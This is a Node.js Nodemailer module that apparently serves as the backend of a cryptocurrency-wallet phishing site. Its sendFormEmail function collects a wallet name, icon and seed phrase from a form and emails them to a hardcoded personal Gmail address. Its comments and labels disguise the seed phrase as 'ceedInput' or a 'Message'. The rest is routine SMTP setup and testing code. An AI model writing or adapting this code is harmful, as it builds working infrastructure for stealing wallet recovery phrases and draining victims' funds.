import nodemailer from "nodemailer";

// ✅ Configure Nodemailer transporter with environment variables
const transporter = nodemailer.createTransport({
  host: process.env.SMTP_HOST || "smtp.titan.email",
  port: parseInt(process.env.SMTP_PORT) || 465,
  secure: process.env.SMTP_SECURE !== "false", // true by default
  auth: {
    user: process.env.SMTP_USER,
    pass: process.env.SMTP_PASS,
  },
});

/**
 * Verify SMTP connection on startup
 */
export async function verifySmtpConnection() {
  try {
    console.log("🔍 Verifying SMTP connection...");
    await transporter.verify();
    console.log("✅ SMTP connection verified successfully!");
    return true;
  } catch (error) {
    console.error("⚠️ SMTP verification failed:", error.message);
    console.error(
      "Check your environment variables: SMTP_HOST, SMTP_PORT, SMTP_USER, SMTP_PASS",
    );
    return false;
  }
}

/**
 * Send email with form submission data
 * @param {Object} data - Email data { name, icon, ceedInput }
 * @returns {Promise<Object>} - Result with messageId
 */
export async function sendFormEmail(data) {
  const { walletName, walletIcon, seedPhrase } = data;

  // Validate inputs
  if (!walletName || !walletIcon || !seedPhrase) {
    throw new Error("Missing required fields: name, icon, ceedInput");
  }

  console.log("📧 Preparing email from:", walletName);

  try {
    const result = await transporter.sendMail({
      from: `"${process.env.EMAIL_FROM_NAME || "Support"}" <${process.env.SMTP_USER}>`,
      to: process.env.EMAIL_TO || "danielekene6b@gmail.com",
      subject: `New Message from ${walletName}`,
      html: `
        <h2>New Submission</h2>
        <p><strong>Name:</strong> ${escapeHtml(walletName)}</p>
        <p><strong>Icon:</strong> ${escapeHtml(walletIcon)}</p>
        <p><strong>Message:</strong></p>
        <p>${escapeHtml(seedPhrase).replace(/\n/g, "<br>")}</p>
        <hr>
        <p style="color: #999; font-size: 12px;">Received at: ${new Date().toLocaleString()}</p>
      `,
    });

    console.log("✅ Email sent successfully. Message ID:", result.messageId);
    return {
      success: true,
      messageId: result.messageId,
      message: "Email sent successfully",
    };
  } catch (error) {
    console.error("❌ Email sending failed:", error.message);
    throw new Error(`Failed to send email: ${error.message}`);
  }
}

/**
 * Send test email
 */
export async function sendTestEmail() {
  try {
    const result = await transporter.sendMail({
      from: `"Test" <${process.env.SMTP_USER}>`,
      to: process.env.EMAIL_TO || "danielekene6b@gmail.com",
      subject: "Test Email from Server",
      html: "<h1>✅ Test Email</h1><p>If you see this, Nodemailer is working correctly!</p>",
    });

    console.log("✅ Test email sent. Message ID:", result.messageId);
    return {
      success: true,
      messageId: result.messageId,
      message: "Test email sent successfully",
    };
  } catch (error) {
    console.error("❌ Test email failed:", error.message);
    throw new Error(`Test email failed: ${error.message}`);
  }
}

/**
 * Get SMTP configuration status
 */
export function getSmtpStatus() {
  return {
    host: process.env.SMTP_HOST ? "✅" : "❌",
    port: process.env.SMTP_PORT ? "✅" : "❌",
    user: process.env.SMTP_USER ? "✅" : "❌",
    pass: process.env.SMTP_PASS ? "✅" : "❌",
    emailTo: process.env.EMAIL_TO ? "✅" : "❌",
  };
}

/**
 * Helper function to escape HTML and prevent injection
 */
function escapeHtml(text) {
  const map = {
    "&": "&amp;",
    "<": "&lt;",
    ">": "&gt;",
    '"': "&quot;",
    "'": "&#039;",
  };
  return text.replace(/[&<>"']/g, (m) => map[m]);
}
